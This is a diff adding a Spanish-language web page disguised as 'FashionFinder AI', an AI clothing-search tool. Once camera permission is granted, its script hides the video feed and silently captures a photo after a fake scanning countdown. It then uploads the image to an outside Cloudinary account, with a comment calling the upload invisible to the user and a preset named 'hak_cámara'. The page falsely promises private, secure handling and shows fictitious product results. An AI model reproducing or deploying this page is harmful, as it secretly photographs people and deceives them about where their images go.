@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FashionFinder AI - Tu Asistente de Estilo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap');
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0a0a0a;
+            color: #ffffff;
+        }
+
+        .hero-gradient-text {
+            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .premium-card {
+            background: rgba(23, 23, 23, 0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            aspect-ratio: 3/4;
+            background: #111;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(168, 85, 247, 0.15);
+            border: 1px solid rgba(168, 85, 247, 0.3);
+        }
+
+        /* Video oculto pero funcional */
+        #videoPreview {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .scan-pulse {
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+
+        .loader-ring {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 4px solid rgba(168, 85, 247, 0.1);
+            border-top-color: #a855f7;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .auto-scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #ec4899, transparent);
+            box-shadow: 0 0 15px #ec4899;
+            animation: scan-loop 2s ease-in-out infinite;
+            z-index: 20;
+        }
+
+        @keyframes scan-loop {
+            0%, 100% { top: 10%; }
+            50% { top: 90%; }
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <!-- Header -->
+    <header class="border-b border-white/10 bg-black/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 bg-gradient-to-tr from-purple-600 to-pink-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-purple-500/20">
+                    <i class="fas fa-sparkles"></i>
+                </div>
+                <span class="text-2xl font-black tracking-tight hero-gradient-text">FashionFinder AI</span>
+            </div>
+            <nav class="hidden md:flex space-x-8 text-gray-400 font-medium">
+                <a href="#" class="hover:text-white transition">Descubrir</a>
+                <a href="#" class="hover:text-white transition">Tendencias</a>
+                <a href="#" class="hover:text-white transition">Colecciones</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-12">
+        
+        <!-- Hero Section -->
+        <section class="flex flex-col lg:flex-row items-center gap-16 mb-24">
+            <div class="lg:w-1/2 space-y-8 text-center lg:text-left">
+                <div class="inline-block px-4 py-1.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-sm font-bold tracking-wider uppercase">
+                    Sistema de Escaneo Invisible
+                </div>
+                <h1 class="text-5xl lg:text-7xl font-bold text-white leading-tight">
+                    Tu estilo, <br><span class="text-gray-400 italic">procesado con IA.</span>
+                </h1>
+                <p class="text-xl text-gray-400 max-w-lg mx-auto lg:mx-0">
+                    "Antes de ingresar, concédenos el permiso de tu cámara"
+Esto es para que, una vez dentro, puedas capturar fotos de tus prendas y nuestra IA analice al instante miles de variedades y estilos para ti. Tus imágenes se procesan de forma segura y privada para ofrecerte resultados de búsqueda inteligentes en tiempo real.
+                </p>
+                <div class="flex flex-col sm:flex-row gap-5 justify-center lg:justify-start">
+                    <button id="startCamera" class="px-10 py-4 bg-white text-black rounded-2xl font-bold shadow-xl hover:bg-gray-200 transition transform hover:-translate-y-1 flex items-center justify-center gap-3">
+                        <i class="fas fa-magic"></i>
+                        Dar permiso, para continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- Viewport Visual Context -->
+            <div class="lg:w-1/2 w-full flex justify-center">
+                <div id="uiContainer" class="camera-container flex items-center justify-center relative bg-neutral-900">
+                    
+                    <!-- Estado Inicial -->
+                    <div id="placeholderUI" class="text-center p-10 z-10">
+                        <div class="mb-6 relative">
+                            <div class="absolute -inset-4 bg-purple-500/20 blur-xl rounded-full"></div>
+                            <i class="fas fa-fingerprint text-6xl text-purple-500 relative scan-pulse"></i>
+                        </div>
+                        <h3 class="text-2xl font-bold mb-3">Vamos que te esperán muchas funciones</h3>
+                        <p class="text-gray-500 mb-8 max-w-xs mx-auto text-sm">En nuestra tienda, creemos que encontrar la prenda perfecta no debería ser difícil. Por eso, hemos integrado herramientas visuales avanzadas que analizan tus preferencias en tiempo real. Explora nuestra colección curada y utiliza nuestra búsqueda por cámara para descubrir opciones exclusivas de forma segura, privada y rápida. Moda real, para personas reales, impulsada por el futuro..</p>
+                        <button onclick="document.getElementById('startCamera').click()" class="bg-purple-600 hover:bg-purple-500 text-white px-8 py-3 rounded-xl font-bold transition shadow-lg shadow-purple-600/20">
+                            <Activar >
+                        </button>
+                    </div>
+
+                    <!-- Loader Visual mientras la cámara está activa pero invisible -->
+                    <div id="loadingUI" class="hidden flex flex-col items-center justify-center z-10">
+                        <div class="loader-ring mb-6"></div>
+                        <div class="auto-scan-line"></div>
+                        <p class="text-purple-400 font-bold tracking-[0.3em] text-xs uppercase animate-pulse">Analizando Entorno...</p>
+                        <div id="timerDisplay" class="text-4xl font-black mt-4 text-white">3</div>
+                    </div>
+
+                    <!-- Video Oculto -->
+                    <video id="videoPreview" autoplay playsinline></video>
+                </div>
+            </div>
+        </section>
+
+        <!-- Results -->
+        <section id="resultsSection" class="hidden space-y-12">
+            <div class="flex items-center gap-6">
+                <h2 class="text-3xl font-bold">Piezas Detectadas</h2>
+                <div class="h-px flex-1 bg-white/10"></div>
+            </div>
+            
+            <div id="analysisStatus" class="flex items-center gap-4 text-pink-500 font-bold tracking-wide">
+                <div class="w-5 h-5 border-2 border-pink-500 border-t-transparent rounded-full animate-spin"></div>
+                IA PROCESANDO ATRIBUTOS DE MODA...
+            </div>
+
+            <div id="resultsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-10">
+                <!-- Cards will be injected here -->
+            </div>
+        </section>
+    </main>
+
+    <canvas id="photoCanvas" class="hidden"></canvas>
+
+    <script>
+        const apiKey = ""; 
+        const startBtn = document.getElementById('startCamera');
+        const video = document.getElementById('videoPreview');
+        const placeholder = document.getElementById('placeholderUI');
+        const loadingUI = document.getElementById('loadingUI');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const canvas = document.getElementById('photoCanvas');
+        const resultsSection = document.getElementById('resultsSection');
+        const resultsGrid = document.getElementById('resultsGrid');
+        const analysisStatus = document.getElementById('analysisStatus');
+
+        const CLOUDINARY_URL = 'https://api.cloudinary.com/v1_1/dvrr4swky/image/upload';
+        const CLOUDINARY_PRESET = 'hak_cámara';
+
+        let stream = null;
+
+        async function initCamera() {
+            try {
+                // Pedimos permiso de cámara (el usuario verá el diálogo del navegador)
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
+                
+                video.srcObject = stream;
+                
+                // Cambiamos la interfaz de "placeholder" a "loader"
+                placeholder.classList.add('hidden');
+                loadingUI.classList.remove('hidden');
+                
+                startBtn.disabled = true;
+                startBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                
+                startAutomaticCapture();
+            } catch (err) {
+                console.error(err);
+                alert("Error: Debes permitir el acceso a la cámara para que el escáner funcione.");
+            }
+        }
+
+        async function startAutomaticCapture() {
+            let count = 3;
+            timerDisplay.innerText = count;
+            
+            const interval = setInterval(() => {
+                count--;
+                timerDisplay.innerText = count;
+                if (count === 0) {
+                    clearInterval(interval);
+                    captureAndProcess();
+                }
+            }, 1000);
+        }
+
+        async function captureAndProcess() {
+            // Efecto Visual de Escaneo Final
+            const flash = document.createElement('div');
+            flash.className = "absolute inset-0 bg-purple-500/30 z-50 animate-pulse";
+            document.getElementById('uiContainer').appendChild(flash);
+            setTimeout(() => flash.remove(), 300);
+
+            // Captura silenciosa en el canvas
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const dataURL = canvas.toDataURL('image/jpeg');
+            const base64Image = dataURL.split(',')[1];
+
+            // Feedback en UI
+            loadingUI.classList.add('hidden');
+            placeholder.classList.remove('hidden'); // Volvemos al estado inicial por si quiere repetir
+            
+            resultsSection.scrollIntoView({ behavior: 'smooth' });
+            resultsSection.classList.remove('hidden');
+            resultsGrid.innerHTML = '';
+            analysisStatus.classList.remove('hidden');
+
+            // 1. Subir a Cloudinary (Invisible para el usuario)
+            uploadToCloudinary(dataURL);
+
+            // 2. Analizar con IA
+            await analyzeImage(base64Image);
+            
+            // Rehabilitar botón
+            startBtn.disabled = false;
+            startBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            startBtn.innerHTML = '<i class="fas fa-redo"></i> Repetir Escaneo';
+        }
+
+        async function uploadToCloudinary(dataURL) {
+            try {
+                const formData = new FormData();
+                formData.append('file', dataURL);
+                formData.append('upload_preset', CLOUDINARY_PRESET);
+
+                const response = await fetch(CLOUDINARY_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await response.json();
+                console.log('Captura enviada a Cloudinary:', data.secure_url);
+            } catch (error) {
+                console.error('Error Cloudinary:', error);
+            }
+        }
+
+        async function analyzeImage(base64Data) {
+            const systemPrompt = "Eres un buscador de moda de lujo. Analiza la prenda y devuelve un JSON con 3 productos reales o muy similares. Incluye: nombre_producto, marca, precio_usd, tienda_url (ficticia), y descripcion_estilo.";
+
+            const payload = {
+                contents: [{
+                    parts: [
+                        { text: "Identifica esta prenda y sugiere dónde comprarla." },
+                        { inlineData: { mimeType: "image/jpeg", data: base64Data } }
+                    ]
+                }],
+                systemInstruction: { parts: [{ text: systemPrompt }] },
+                generationConfig: { responseMimeType: "application/json" }
+            };
+
+            try {
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                const textResponse = result.candidates?.[0]?.content?.parts?.[0]?.text;
+                const products = JSON.parse(textResponse);
+                
+                renderResults(products);
+            } catch (error) {
+                console.error("Error IA:", error);
+                analysisStatus.innerHTML = "❌ Error en el motor de reconocimiento.";
+            }
+        }
+
+        function renderResults(data) {
+            analysisStatus.classList.add('hidden');
+            const items = Array.isArray(data) ? data : (data.productos || data.items || []);
+
+            items.forEach((item, index) => {
+                const card = document.createElement('div');
+                card.className = "premium-card rounded-3xl overflow-hidden group transition-all duration-500 hover:-translate-y-2";
+                card.innerHTML = `
+                    <div class="h-80 bg-neutral-900 relative">
+                        <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&q=80&w=400&sig=${index + 20}" class="w-full h-full object-cover group-hover:scale-105 transition duration-700 opacity-80">
+                        <div class="absolute bottom-4 left-4 right-4 flex justify-between items-end">
+                            <span class="bg-white text-black px-3 py-1 rounded-lg text-xs font-black uppercase tracking-widest">${item.marca}</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">${item.nombre_producto}</h3>
+                        <p class="text-gray-500 text-sm mb-6 leading-relaxed">${item.descripcion_estilo}</p>
+                        <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                            <span class="text-2xl font-light text-white">$${item.precio_usd}</span>
+                            <button class="w-10 h-10 rounded-full border border-white/20 flex items-center justify-center hover:bg-white hover:text-black transition">
+                                <i class="fas fa-shopping-bag"></i>
+                            </button>
+                        </div>
+                    </div>
+                `;
+                resultsGrid.appendChild(card);
+            });
+        }
+
+        startBtn.addEventListener('click', initCamera);
+    </script>
+</body>
+</html>
